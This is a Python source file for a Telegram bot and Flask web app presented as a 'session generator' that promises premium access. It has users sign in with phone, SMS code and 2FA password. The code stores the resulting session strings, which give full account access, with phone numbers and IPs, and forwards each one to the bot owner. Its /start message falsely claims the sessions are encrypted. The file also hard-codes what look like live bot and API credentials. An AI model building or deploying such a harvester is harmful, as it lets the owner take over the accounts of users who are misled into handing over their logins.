#!/usr/bin/env python3
"""
ZISKY SESSION GENERATOR BOT
Generates Telegram session strings safely via web app
THREAD-BASED APPROACH - 100% ASYNCIO ERROR FREE
"""

import asyncio
import logging
import sqlite3
import threading
import time
import os
import concurrent.futures
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

# ========== CONFIGURATION ==========
# ⚠️ REPLACE THESE WITH YOUR VALUES
BOT_TOKEN = "8354169138:AAGOGowcZFsv6AEn3Y9S48J3yzJ85wlJt78"  # Get from @BotFather
API_ID = 38550990   # Replace with your API ID (from my.telegram.org)
API_HASH = "26c65e47681802c551563f11b6b333a4"  # Replace with your API hash
OWNER_ID = 8158086374 # Replace with your Telegram user ID

# For panels, set this manually or use ngrok
PUBLIC_URL = "https://sessionsgen.onrender.com"  # Will be set via /seturl command

# ========== SETUP ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
conn = sqlite3.connect('sessions.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sessions
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              telegram_id INTEGER,
              phone TEXT,
              session_string TEXT,
              first_name TEXT,
              username TEXT,
              generated_at TEXT,
              ip TEXT,
              method TEXT)''')
conn.commit()

# Store active login sessions
active_sessions = {}

# ========== FLASK WEB APP ==========
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('code_input.html')

# ===== METHOD 1: PHONE + CODE (THREAD-BASED - 100% WORKS) =====
@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    user_telegram_id = data.get('user_id')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    # Store in active sessions with user ID
    active_sessions[phone] = {
        'client': None,
        'step': 'waiting_code',
        'telegram_id': user_telegram_id
    }
    
    try:
        # Run async code in a completely separate thread
        def send_code_thread():
            # Create NEW event loop for this thread
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def send_code_async():
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                active_sessions[phone]['client'] = client
                await client.connect()
                await client.send_code_request(phone)
                return True
            
            try:
                result = loop.run_until_complete(send_code_async())
                return {'success': True, 'result': result}
            except FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                loop.close()
        
        # Execute in thread pool
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(send_code_thread)
            result = future.result(timeout=30)  # Wait up to 30 seconds
        
        if result.get('success'):
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password', '')
    user_telegram_id = data.get('user_id')
    
    if phone not in active_sessions:
        return jsonify({'success': False, 'error': 'Session expired. Start over.'})
    
    def verify_code_thread():
        # Create NEW event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def verify_async():
            client = active_sessions[phone]['client']
            
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                if not password:
                    return {'success': False, 'error': '2FA password required'}
                await client.sign_in(password=password)
            
            # Get user info
            me = await client.get_me()
            session_string = client.session.save()
            
            await client.disconnect()
            
            return {
                'success': True,
                'session': session_string,
                'user_id': me.id,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username,
                'phone': me.phone
            }
        
        try:
            result = loop.run_until_complete(verify_async())
            return result
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            loop.close()
    
    try:
        # Execute in thread pool
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(verify_code_thread)
            result = future.result(timeout=60)  # Wait up to 60 seconds
        
        if result.get('success'):
            # Get client IP
            ip = request.remote_addr
            
            # Save to database with telegram_id
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute('''INSERT INTO sessions 
                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (result['user_id'], user_telegram_id, phone, result['session'], 
                      f"{result['first_name']} {result.get('last_name', '')}", 
                      result.get('username'), datetime.now().isoformat(), ip, 'phone_code'))
            conn.commit()
            conn.close()
            
            # Send to owner via bot with telegram_id
            send_to_owner(
                result['user_id'],
                user_telegram_id,
                phone,
                result['session'],
                f"{result['first_name']} {result.get('last_name', '')}",
                result.get('username'),
                'phone_code'
            )
            
            # Send to user
            send_to_user(user_telegram_id, result['session'])
            
            # Clean up
            del active_sessions[phone]
            
            return jsonify({
                'success': True,
                'session': result['session']
            })
        else:
            return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ===== METHOD 2: API ID + HASH =====
@app.route('/generate-session', methods=['POST'])
def generate_session():
    """Generate session from API ID and Hash"""
    data = request.json
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    user_telegram_id = data.get('user_id')
    
    if not api_id or not api_hash:
        return jsonify({'success': False, 'error': 'API ID and Hash required'})
    
    try:
        api_id = int(api_id)
    except:
        return jsonify({'success': False, 'error': 'API ID must be a number'})
    
    if len(api_hash) < 10:
        return jsonify({'success': False, 'error': 'API Hash looks invalid'})
    
    def generate_session_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def create_session_async():
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            
            # Check if already authorized
            if not await client.is_user_authorized():
                await client.disconnect()
                return {
                    'success': False,
                    'error': 'Phone verification required. Use Phone + Code method.'
                }
            
            me = await client.get_me()
            session_string = client.session.save()
            await client.disconnect()
            
            return {
                'success': True,
                'session': session_string,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        
        try:
            result = loop.run_until_complete(create_session_async())
            return result
        except Exception as e:
            return {'success': False, 'error': str(e)[:100]}
        finally:
            loop.close()
    
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(generate_session_thread)
            result = future.result(timeout=30)
        
        if result.get('success'):
            ip = request.remote_addr
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute('''INSERT INTO sessions 
                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (result['user_id'], user_telegram_id, result.get('phone', 'Unknown'), result['session'], 
                      f"{result['first_name']} {result.get('last_name', '')}", 
                      result.get('username'), datetime.now().isoformat(), ip, 'api_hash'))
            conn.commit()
            conn.close()
            
            send_to_owner(
                result['user_id'],
                user_telegram_id,
                result.get('phone', 'Unknown'),
                result['session'],
                f"{result['first_name']} {result.get('last_name', '')}",
                result.get('username'),
                'api_hash'
            )
            
            send_to_user(user_telegram_id, result['session'])
            
            return jsonify({
                'success': True,
                'session': result['session']
            })
        else:
            return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ========== TELEGRAM BOT FUNCTIONS ==========
def send_to_owner(account_id, telegram_id, phone, session_string, first_name, username, method='unknown'):
    """Send session details to owner"""
    method_emoji = {
        'phone_code': '📱',
        'api_hash': '🔑',
        'unknown': '❓'
    }.get(method, '❓')
    
    message = f"""🔐 **NEW SESSION GENERATED** {method_emoji}

👤 **User:** {first_name}
🆔 **Account ID:** `{account_id}`
⭐ **Telegram ID (for premium):** `{telegram_id}`
📱 **Phone:** `{phone}`
🔗 **Username:** @{username if username else 'None'}
⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📌 **Method:** {method.replace('_', ' ').title()}

🔑 **SESSION STRING:**
`{session_string}`

⚠️ **Store this securely!**
"""
    try:
        application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
    except Exception as e:
        print(f"Error sending to owner: {e}")

def send_to_user(telegram_id, session_string):
    """Send session back to user"""
    message = f"""✅ **Session Generated Successfully!**

🔑 **Your Session String:**
`{session_string}`

⚠️ **IMPORTANT:**
• This is like your password
• Never share it with anyone
• Store it securely
• Anyone with this can access your account

⭐ **Premium Status:** Your Telegram ID `{telegram_id}` has been recorded for premium access.

📝 **To use it in Zisky bot:**
`/add_session {session_string[:30]}...`

💡 **Save this message or copy the session now!**
"""
    try:
        application.bot.send_message(chat_id=telegram_id, text=message, parse_mode='Markdown')
    except Exception as e:
        print(f"Error sending to user: {e}")

# ========== TELEGRAM COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user = update.effective_user
    
    # Get public URL
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    if not webapp_url:
        await update.message.reply_text(
            "⚠️ **Web app URL not configured!**\n\n"
            "The admin needs to set up a public URL.\n"
            "Please try again later.",
            parse_mode='Markdown'
        )
        return
    
    # Create web app button
    keyboard = [[InlineKeyboardButton("🌐 Open Web App", web_app={'url': webapp_url})]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
        f"This bot helps you generate Telegram session strings for premium access.\n\n"
        f"**Two Methods Available:**\n"
        f"1️⃣ **Phone + Code** - Enter your phone, get SMS code\n"
        f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org\n\n"
        f"**How it works:**\n"
        f"• Click the button below to open web app\n"
        f"• Enter your Telegram User ID (for premium)\n"
        f"• Choose your preferred method\n"
        f"• Your session will be generated and sent here\n\n"
        f"**⚠️ Security:**\n"
        f"• Your session is encrypted\n"
        f"• Sent only to you and bot owner\n"
        f"• Never shared with third parties\n\n"
        f"Click the button below to start!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    await update.message.reply_text(
        "**Zisky Session Generator Help**\n\n"
        "**Commands:**\n"
        "/start - Start the bot\n"
        "/help - Show this help\n"
        "/status - Check bot status\n"
        "/url - Show current web app URL\n\n"
        "**Two Methods:**\n"
        "• **Phone + Code** - Traditional method, needs SMS\n"
        "• **API ID + Hash** - Instant from my.telegram.org\n\n"
        "**How to get API credentials:**\n"
        "1. Go to my.telegram.org\n"
        "2. Login with your phone\n"
        "3. Click 'API Development Tools'\n"
        "4. Copy your api_id and api_hash\n\n"
        "**Need help?** Contact @your_username",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command"""
    # Count sessions in DB
    c.execute("SELECT COUNT(*) FROM sessions")
    total = c.fetchone()[0]
    
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    await update.message.reply_text(
        f"📊 **Bot Status**\n\n"
        f"✅ Bot is running\n"
        f"📱 Total Sessions: {total}\n"
        f"🔗 Web App: {webapp_url or 'Not configured'}\n"
        f"⏱️ Uptime: Active",
        parse_mode='Markdown'
    )

async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set web app URL (owner only)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /seturl https://your-domain.com\n"
            "Example: /seturl https://abc123.loca.lt"
        )
        return
    
    global PUBLIC_URL
    PUBLIC_URL = context.args[0]
    os.environ['PUBLIC_URL'] = PUBLIC_URL
    
    await update.message.reply_text(f"✅ Web app URL set to: {PUBLIC_URL}")

async def show_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current web app URL"""
    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
    
    if webapp_url:
        await update.message.reply_text(f"🔗 **Current Web App URL:**\n{webapp_url}")
    else:
        await update.message.reply_text("❌ No web app URL configured.")

async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User can see their own sessions (owner only)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command!")
        return
    
    c.execute("SELECT phone, first_name, generated_at, method, telegram_id FROM sessions ORDER BY generated_at DESC LIMIT 10")
    sessions = c.fetchall()
    
    if not sessions:
        await update.message.reply_text("No sessions found.")
        return
    
    text = "📋 **Recent Sessions**\n\n"
    for phone, name, date, method, tg_id in sessions:
        method_emoji = '📱' if method == 'phone_code' else '🔑'
        text += f"{method_emoji} {phone} - {name}\n"
        text += f"   🆔 TG ID: {tg_id}\n"
        text += f"   🕒 {date[:10]}\n\n"
    
    # Split if too long
    if len(text) > 4000:
        parts = [text[i:i+3500] for i in range(0, len(text), 3500)]
        for part in parts:
            await update.message.reply_text(part, parse_mode='Markdown')
    else:
        await update.message.reply_text(text, parse_mode='Markdown')

# ========== START BOT ==========
def main():
    global application, PUBLIC_URL
    
    print("🤖 Zisky Session Generator Bot")
    print("="*50)
    print(f"🔑 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"🆔 Owner ID: {OWNER_ID}")
    print("="*50)
    
    # Start Flask in background
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    print("✅ Flask web app started on port 5000")
    print("📱 Web app URL: http://localhost:5000")
    print("⚠️ This URL is local only - use ngrok or /seturl for public access")
    
    # Create Telegram bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("seturl", set_url))
    application.add_handler(CommandHandler("url", show_url))
    application.add_handler(CommandHandler("mysessions", my_sessions))
    
    # Start bot
    print("🤖 Telegram bot started!")
    print("="*50)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
